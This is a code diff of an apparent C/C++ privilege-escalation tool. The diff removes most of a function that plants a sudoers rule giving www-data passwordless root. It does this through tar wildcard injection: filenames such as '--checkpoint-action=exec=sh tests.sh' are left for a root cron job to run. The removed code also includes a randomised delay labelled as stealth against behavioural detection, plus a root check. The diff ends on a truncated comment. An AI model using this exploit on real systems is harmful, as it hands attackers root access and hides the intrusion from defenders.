@@ -19,6 +19,7 @@
 #include <sys/syscall.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+#include <time.h>       // FIXED: Added for CLOCK_REALTIME
 #include <cstring>
 
 // ============================================================================
@@ -112,107 +113,4 @@ int execute_tar_privesc() {
     // ========================================================================
     // Step 3: Create malicious script (tests.sh)
     // ========================================================================
-    // This script will be executed by tar when the cron job runs
-    // It creates a sudoers entry allowing www-data to run commands as root
-    
-    const char* script_content = 
-        "#!/bin/bash\n"
-        "echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers.d/www-data\n"
-        "chmod 440 /etc/sudoers.d/www-data\n";
-    
-    char script_path[128];
-    str_copy(script_path, backups_dir, 128);
-    str_concat(script_path, "/tests.sh", 128);
-    
-    if (!create_file(script_path, script_content, 0755)) {
-        return -1;
-    }
-    
-    // ========================================================================
-    // Step 4: Create tar checkpoint files for wildcard exploitation
-    // ========================================================================
-    // These files will be interpreted as tar command-line arguments
-    // when the cron job executes: tar -cf /tmp/backup.tar *
-    //
-    // The wildcard * expands to include these filenames, which tar
-    // interprets as:
-    //   tar -cf /tmp/backup.tar --checkpoint=1 --checkpoint-action=exec=sh tests.sh
-    
-    // File 1: --checkpoint=1
-    // This tells tar to execute an action every 1 record
-    char checkpoint1_path[128];
-    str_copy(checkpoint1_path, backups_dir, 128);
-    str_concat(checkpoint1_path, "/--checkpoint=1", 128);
-    
-    if (!create_file(checkpoint1_path, "", 0644)) {
-        return -1;
-    }
-    
-    // File 2: --checkpoint-action=exec=sh tests.sh
-    // This tells tar to execute our malicious script
-    char checkpoint2_path[128];
-    str_copy(checkpoint2_path, backups_dir, 128);
-    str_concat(checkpoint2_path, "/--checkpoint-action=exec=sh tests.sh", 128);
-    
-    if (!create_file(checkpoint2_path, "", 0644)) {
-        return -1;
-    }
-    
-    // ========================================================================
-    // Step 5: Create a dummy file to ensure tar has something to archive
-    // ========================================================================
-    char dummy_path[128];
-    str_copy(dummy_path, backups_dir, 128);
-    str_concat(dummy_path, "/dummy.txt", 128);
-    
-    if (!create_file(dummy_path, "exploit payload\n", 0644)) {
-        return -1;
-    }
-    
-    // ========================================================================
-    // Step 6: Wait for cron job with RANDOMIZED timing (STEALTH-ENHANCED)
-    // ========================================================================
-    // STEALTH IMPROVEMENT: Randomized delay to avoid behavioral detection
-    
-    unsigned int random_seed;
-    
-    // Get random seed from /dev/urandom (stealthy - single syscall)
-    int urandom_fd = syscall(SYS_open, "/dev/urandom", O_RDONLY);
-    if (urandom_fd >= 0) {
-        syscall(SYS_read, urandom_fd, &random_seed, sizeof(random_seed));
-        syscall(SYS_close, urandom_fd);
-    } else {
-        // Fallback: use high-resolution timestamp + PID
-        struct timespec ts;
-        syscall(SYS_clock_gettime, CLOCK_REALTIME, &ts);
-        random_seed = (ts.tv_sec ^ ts.tv_nsec) ^ (syscall(SYS_getpid) << 16);
-    }
-    
-    // Generate random delay between 60-75 seconds
-    // Cron runs every minute, so we need at least 60 seconds
-    // Upper bound of 75 ensures we catch the next execution
-    unsigned int random_delay = 60 + (random_seed % 16);
-    
-    // Also randomize nanoseconds for additional entropy
-    unsigned int random_nanos = (random_seed >> 16) % 1000000000;
-    
-    struct timespec sleep_time;
-    sleep_time.tv_sec = random_delay;
-    sleep_time.tv_nsec = random_nanos;
-    
-    // Execute sleep (single syscall)
-    syscall(SYS_nanosleep, &sleep_time, nullptr);
-    
-    return 0;
-}
-
-// ============================================================================
-// ROOT CHECK
-// ============================================================================
-
-bool check_if_root() {
-    unsigned int uid = syscall(SYS_getuid);
-    unsigned int euid = syscall(SYS_geteuid);
-    
-    return (uid == 0 || euid == 0);
-}
+    // 
